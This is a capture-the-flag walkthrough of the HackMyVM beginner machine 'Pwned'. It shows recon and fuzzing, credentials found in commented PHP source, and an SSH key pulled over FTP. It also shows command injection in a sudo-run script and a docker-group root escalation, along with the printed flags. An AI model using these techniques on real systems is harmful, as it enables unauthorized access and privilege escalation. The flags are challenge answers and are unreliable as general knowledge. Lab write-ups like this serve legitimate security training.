# Pwned

## Executive Summary
|Machine|Author  |Category|Platform|
|-------|--------|--------|--------|
|Pwned  |annlynn |Beginner|HackMyVM|

## Reconnaissance
### Nmap Scan
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ nmap -sVC -p- -T4 192.168.100.227 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-28 08:22 +07
Nmap scan report for pwned.lan (192.168.100.227)
Host is up (0.00084s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 fe:cd:90:19:74:91:ae:f5:64:a8:a5:e8:6f:6e:ef:7e (RSA)
|   256 81:32:93:bd:ed:9b:e7:98:af:25:06:79:5f:de:91:5d (ECDSA)
|_  256 dd:72:74:5d:4d:2d:a3:62:3e:81:af:09:51:e0:14:4a (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Pwned....!!
|_http-server-header: Apache/2.4.38 (Debian)
MAC Address: 08:00:27:DA:40:F5 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.87 seconds
```
### FTP Service
```bash                                                                             ┌──(dungcngo㉿kali)-[/tmp]
└─$ ftp 192.168.100.227
Connected to 192.168.100.227.
220 (vsFTPd 3.0.3)
Name (192.168.100.227:dungcngo): dungcngo
530 Permission denied.
ftp: Login failed
ftp> bye
221 Goodbye.
```

### Web Application 
![pwned-web](/walkthroughs/hackmyvm/machines/beginner/Pwned/pwned-web.png)

```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ curl http://192.168.100.227/
 <!DOCTYPE html>
<html>
<head>
<title>Pwned....!!</title>
</head>
<body>

<h1>  vanakam nanba (Hello friend) </h1>
<p></p>

<p> 
<pre>    


     
                                                                                                                 dddddddd
  PPPPPPPPPPPPPPPPP                                                                                              d::::::d
  P::::::::::::::::P                                                                                             d::::::d
  P::::::PPPPPP:::::P                                                                                            d::::::d
  PP:::::P     P:::::P                                                                                           d:::::d 
    P::::P     P:::::Pwwwwwww           wwwww           wwwwwwwnnnn  nnnnnnnn        eeeeeeeeeeee        ddddddddd:::::d 
    P::::P     P:::::P w:::::w         w:::::w         w:::::w n:::nn::::::::nn    ee::::::::::::ee    dd::::::::::::::d 
    P::::PPPPPP:::::P   w:::::w       w:::::::w       w:::::w  n::::::::::::::nn  e::::::eeeee:::::ee d::::::::::::::::d 
    P:::::::::::::PP     w:::::w     w:::::::::w     w:::::w   nn:::::::::::::::ne::::::e     e:::::ed:::::::ddddd:::::d 
    P::::PPPPPPPPP        w:::::w   w:::::w:::::w   w:::::w      n:::::nnnn:::::ne:::::::eeeee::::::ed::::::d    d:::::d 
    P::::P                 w:::::w w:::::w w:::::w w:::::w       n::::n    n::::ne:::::::::::::::::e d:::::d     d:::::d 
    P::::P                  w:::::w:::::w   w:::::w:::::w        n::::n    n::::ne::::::eeeeeeeeeee  d:::::d     d:::::d 
    P::::P                   w:::::::::w     w:::::::::w         n::::n    n::::ne:::::::e           d:::::d     d:::::d 
  PP::::::PP                  w:::::::w       w:::::::w          n::::n    n::::ne::::::::e          d::::::ddddd::::::dd
  P::::::::P                   w:::::w         w:::::w           n::::n    n::::n e::::::::eeeeeeee   d:::::::::::::::::d
  P::::::::P                    w:::w           w:::w            n::::n    n::::n  ee:::::::::::::e    d:::::::::ddd::::d
  PPPPPPPPPP                     www             www             nnnnnn    nnnnnn    eeeeeeeeeeeeee     ddddddddd   ddddd
                                                                           
                                                                                                                     
                                                                                                                       
          

        A last note from Attacker :)

                   I am Annlynn. I am the hacker hacked your server with your employees but they don't know how i used them. 
                   Now they worry about this. Before finding me investigate your employees first. (LOL) then find me Boomers XD..!!

 
            </pre>
 </p>

</body>
</html> 





<!-- I forgot to add this on last note
     You are pretty smart as i thought 
     so here i left it for you 
     She sings very well. l loved it  -->
```

Critical Findings:
- The attacker mentions compromissing employees, hinting that user credentials or information may be hidden on the system.
- An HTML comment at the bottom states: "She sings very welll. I loved it". This cryptic messsage may be a hint about a female username or a reference to finding something related to a female user.

#### Directory Enummeration
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ gobuster dir -u http://192.168.100.227/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.100.227/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/nothing              (Status: 301) [Size: 320] [--> http://192.168.100.227/nothing/]                                                                         
/server-status        (Status: 403) [Size: 280]
/hidden_text          (Status: 301) [Size: 324] [--> http://192.168.100.227/hidden_text/]                                                                     
Progress: 220557 / 220557 (100.00%)
===============================================================
Finished
===============================================================
```
Two directories were discovered: `/nothing` and `/hidden_text`.

#### Investigating /nothing directory
![nothing-web](/walkthroughs/hackmyvm/machines/beginner/Pwned/nothing.png)

![nothing-web](/walkthroughs/hackmyvm/machines/beginner/Pwned/nothing-html.png)

#### Investigating /hidden_text directory
![hidden-text-web](/walkthroughs/hackmyvm/machines/beginner/Pwned/hidden-text.png)

![secret-dic](/walkthroughs/hackmyvm/machines/beginner/Pwned/secret-dic.png)

#### Custom Wordlist Fuzzing
Downloading the wordlist and using it with `ffuf` to discover hidden enpoints:
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ curl -O http://192.168.100.227/hidden_text/secret.dic
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   211 100   211   0     0 12992     0  --:--:-- --:--:-- --:--:-- 13187
                                                                                    
┌──(dungcngo㉿kali)-[/tmp]
└─$ ls
config-err-PHPug6
secret.dic
systemd-private-eef8255720a4430f82aff505cacef74a-colord.service-HZ51Dq
systemd-private-eef8255720a4430f82aff505cacef74a-haveged.service-Iga7JM
systemd-private-eef8255720a4430f82aff505cacef74a-ModemManager.service-lB0lF2
systemd-private-eef8255720a4430f82aff505cacef74a-pcscd.service-1ksvSj
systemd-private-eef8255720a4430f82aff505cacef74a-polkit.service-EWaN1I
systemd-private-eef8255720a4430f82aff505cacef74a-systemd-logind.service-r9qiDH
systemd-private-eef8255720a4430f82aff505cacef74a-upower.service-xOWQqs
                                                                                    
┌──(dungcngo㉿kali)-[/tmp]
└─$ ffuf -u http://192.168.100.227/FUZZ -w secret.dic    

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.100.227/FUZZ
 :: Wordlist         : FUZZ: /tmp/secret.dic
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

:: Progress: [22/22] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 :                        [Status: 200, Size: 3065, Words: 1523, Lines: 76, Duration: 6ms]
:: Progress: [22/22] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 :/pwned.vuln             [Status: 301, Size: 323, Words: 20, Lines: 10, Duration: 8ms]
:: Progress: [22/22] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::: Progress: [22/22] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
```
The fuzzing revealed a valid endpoint: `/pwned.vuln`.


### Initial Access
#### Credential Discovery
![pwned-vuln](/walkthroughs/hackmyvm/machines/beginner/Pwned/pwned-vuln.png)
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ curl http://192.168.100.227/pwned.vuln/
<!DOCTYPE html>
<html>
<head> 
        <title>login</title>
</head>
<body>
                <div id="main">
                        <h1> vanakam nanba. I hacked your login page too with advanced hacking method</h1>
                        <form method="POST">
                        Username <input type="text" name="username" class="text" autocomplete="off" required>
                        Password <input type="password" name="password" class="text" required>
                        <input type="submit" name="submit" id="sub">
                        </form>
                        </div>
</body>
</html>




<?php
//      if (isset($_POST['submit'])) {
//              $un=$_POST['username'];
//              $pw=$_POST['password'];
//
//      if ($un=='ftpuser' && $pw=='B0ss_B!TcH') {
//              echo "welcome"
//              exit();
// }
// else 
//      echo "Invalid creds"
// }
?>
```
Discovered credentials:
- username: `ftpuser`
- password: `B0ss_B!TcH`

#### PTP Access
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ ftp 192.168.100.227
Connected to 192.168.100.227.
220 (vsFTPd 3.0.3)
Name (192.168.100.227:dungcngo): ftpuser
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> whoami
?Invalid command.
ftp> ls -la
229 Entering Extended Passive Mode (|||44222|)
150 Here comes the directory listing.
drwxrwxrwx    3 0        0            4096 Jul 09  2020 .
drwxr-xr-x    5 0        0            4096 Jul 10  2020 ..
drwxr-xr-x    2 0        0            4096 Jul 10  2020 share
226 Directory send OK.
ftp> cd share
250 Directory successfully changed.
ftp> ls -la
229 Entering Extended Passive Mode (|||7384|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Jul 10  2020 .
drwxrwxrwx    3 0        0            4096 Jul 09  2020 ..
-rw-r--r--    1 0        0            2602 Jul 09  2020 id_rsa
-rw-r--r--    1 0        0              75 Jul 09  2020 note.txt
226 Directory send OK.
ftp> mget *
mget id_rsa [anpqy?]? y
229 Entering Extended Passive Mode (|||10740|)
150 Opening BINARY mode data connection for id_rsa (2602 bytes).
100% |***************************************|  2602       44.75 KiB/s    00:00 ETA
226 Transfer complete.
2602 bytes received in 00:00 (41.25 KiB/s)
mget note.txt [anpqy?]? y
229 Entering Extended Passive Mode (|||8072|)
150 Opening BINARY mode data connection for note.txt (75 bytes).
100% |***************************************|    75       17.63 KiB/s    00:00 ETA
226 Transfer complete.
75 bytes received in 00:00 (11.34 KiB/s)
ftp> bye
221 Goodbye.
```
Critial Files:
- `id_rsa` - An SSH private key 
- `note.txt` - A text file containing a clue.

#### Analyzing note.txt file
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ cat note.txt                           

Wow you are here 

ariana won't happy about this note 

sorry ariana :( 
```
#### SSH access as Ariana
```bash
┌──(dungcngo㉿kali)-[/tmp]
└─$ chmod 600 id_rsa
                                                                                    
┌──(dungcngo㉿kali)-[/tmp]
└─$ ssh -i id_rsa ariana@192.168.100.227
The authenticity of host '192.168.100.227 (192.168.100.227)' can't be established.
ED25519 key fingerprint is: SHA256:Eu7UdscPxuaxyzophLkeILniUaKCge0R96HjWhAmpyk
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.100.227' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Linux pwned 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Jul 10 13:03:23 2020 from 192.168.18.70
ariana@pwned:~$ id ; hostname
uid=1000(ariana) gid=1000(ariana) groups=1000(ariana),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth)
pwned
ariana@pwned:~$ ls -la
total 40
drwxrwx--- 4 ariana ariana 4096 Jul 10  2020 .
drwxr-xr-x 5 root   root   4096 Jul 10  2020 ..
-rw-r--r-- 1 ariana ariana  142 Jul 10  2020 ariana-personal.diary
-rw------- 1 ariana ariana    4 Jul 10  2020 .bash_history
-rw-r--r-- 1 ariana ariana  220 Jul  4  2020 .bash_logout
-rw-r--r-- 1 ariana ariana 3526 Jul  4  2020 .bashrc
drwxr-xr-x 3 ariana ariana 4096 Jul  6  2020 .local
-rw-r--r-- 1 ariana ariana  807 Jul  4  2020 .profile
drwx------ 2 ariana ariana 4096 Jul  9  2020 .ssh
-rw-r--r-- 1 ariana ariana  143 Jul 10  2020 user1.txt
```
### Flag user Ariana
```bash
ariana@pwned:~$ cat user1.txt 
congratulations you Pwned ariana 

Here is your user flag ↓↓↓↓↓↓↓

fb8d98be1265dd88bac522e1b2182140

Try harder.need become root
```

### Privilege Escalation
#### User Enummeration
```bash
ariana@pwned:~$ cat /etc/passwd | grep /bin/bash
root:x:0:0:root:/root:/bin/bash
ariana:x:1000:1000:Ariana,,,:/home/ariana:/bin/bash
selena:x:1001:1001:,,,:/home/selena:/bin/bash
ftpuser:x:1002:1002::/home/ftpuser:/bin/bash
```
There are four users with bash shells: `root`, `ariana`, `selena` and `ftpuser`. 

#### Ariana -> Selena
```bash
ariana@pwned:~$ sudo -l
Matching Defaults entries for ariana on pwned:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User ariana may run the following commands on pwned:
    (selena) NOPASSWD: /home/messenger.sh
```
User `ariana` can execute `/home/messenger.sh` as user `selena` without a password.
```bash
ariana@pwned:~$ cat /home/messenger.sh 
#!/bin/bash

clear
echo "Welcome to linux.messenger "
                echo ""
users=$(cat /etc/passwd | grep home |  cut -d/ -f 3)
                echo ""
echo "$users"
                echo ""
read -p "Enter username to send message : " name 
                echo ""
read -p "Enter message for $name :" msg
                echo ""
echo "Sending message to $name "

$msg 2> /dev/null

                echo ""
echo "Message sent to $name :) "
                echo ""
```
The line  `$msg 2> /dev/null` executes user input directly without any sanitization. This is a classic **command injection** vulnerability.

```bash
ariana@pwned:~$ sudo -u selena /home/messenger.sh
Welcome to linux.messenger 


ariana:
selena:
ftpuser:

Enter username to send message : selena

Enter message for selena :/bin/bash

Sending message to selena 
id
uid=1001(selena) gid=1001(selena) groups=1001(selena),115(docker)
```
```bash
which python3
/usr/bin/python3
python3 -c 'import pty;pty.spawn("/bin/bash")'
selena@pwned:/home/ariana$ cd
selena@pwned:~$ ls
selena-personal.diary  user2.txt
```
#### Flag user Selena
```bash
selena@pwned:~$ cat selena-personal.diary                                            
Its Selena personal Diary :::                                                        

Today Ariana fight with me for Ajay. so i left her ssh key on FTP. now she resposible for the leak.
selena@pwned:~$ cat user2.txt
711fdfc6caad532815a440f7f295c176

You are near to me. you found selena too.

Try harder to catch me
```

#### Privilege Escalation: Selena -> Root
```bash
selena@pwned:~$ id
uid=1001(selena) gid=1001(selena) groups=1001(selena),115(docker)
selena@pwned:~$ which docker
/usr/bin/docker
selena@pwned:~$ 
```
User `selena` in the `docker` group have effective `root` access because they can mount the host filesystem inside a container and interact with it as `root`.
![gtfo-docker](/walkthroughs/hackmyvm/machines/beginner/Pwned/gtfo-docker-shell.png)
```bash
selena@pwned:~$ docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh
# id
uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
```
#### Flag user Root
```bash
# cat /root/root.txt
4d4098d64e163d2726959455d046fd7c



You found me. i dont't expect this （◎ . ◎）

I am Ajay (Annlynn) i hacked your server left and this for you.

I trapped Ariana and Selena to takeover your server :)


You Pwned the Pwned congratulations :)

share the screen shot or flags to given contact details for confirmation 

Telegram   https://t.me/joinchat/NGcyGxOl5slf7_Xt0kTr7g

Instgarm   ajs_walker 

Twitter    Ajs_walker 
```


***You are welcome!***
